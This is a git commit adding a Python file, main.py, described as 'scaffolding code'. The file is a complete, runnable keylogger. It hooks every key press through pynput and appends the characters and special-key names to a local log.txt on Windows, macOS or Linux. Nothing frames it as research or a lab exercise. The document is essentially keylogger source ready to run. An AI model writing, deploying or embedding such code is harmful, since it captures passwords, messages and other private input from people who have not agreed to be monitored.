847a78a1b804674e1d2a0dfca266c47b00090464
RykerWilder <fabiomasciarelliwd@gmail.com>
2026-01-08 18:24:01 +0100

    scaffolding code

---
+++ main.py
@@ -0,0 +1,30 @@
+from pynput.keyboard import Key, Listener
+import platform
+
+def on_press(key):
+    """Handle key press events and log them to file."""
+    try:
+        # Handle alphanumeric keys
+        key_data = key.char
+    except AttributeError:
+        # Handle special keys (e.g., Key.space, Key.enter)
+        key_data = str(key).replace("Key.", "")
+
+        
+    write_file(key_data)
+    
+def write_file(key_data):
+    if platform.system() == "Windows":
+        with open('log.txt', 'a') as f:
+            f.write(f"{key_data} ")
+            
+    elif platform.system() == "Darwin":
+        with open('log.txt', 'a') as f:
+            f.write(f"{key_data} ")
+    elif platform.system() == "Linux":
+        with open('log.txt', 'a') as f:
+            f.write(f"{key_data} ")
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
